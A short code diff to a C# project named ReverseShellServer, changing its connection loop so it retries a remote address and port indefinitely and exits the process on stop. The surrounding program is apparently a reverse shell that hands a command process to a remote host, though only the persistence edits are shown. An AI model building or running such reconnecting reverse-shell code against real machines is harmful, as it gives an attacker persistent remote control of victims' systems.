@@ -14,8 +14,6 @@ namespace ReverseShellServer
     {
         Process processCmd { get; set; }
 
-        bool terminate { get; set; }
-
 
         public ServerManager()
         {
@@ -30,7 +28,7 @@ namespace ReverseShellServer
 
         public void Start(string remoteAdress, int remotePort, int retryDelay)
         {
-            while (!terminate)
+            while (true)
             {
                 RunServer(remoteAdress, remotePort);
                 Thread.Sleep(retryDelay);           //Wait for a time and try again
@@ -165,7 +163,7 @@ namespace ReverseShellServer
         void StopServer()
         {
             Cleanup();
-            terminate = true;
+            Environment.Exit(0);
         }
     }
 }
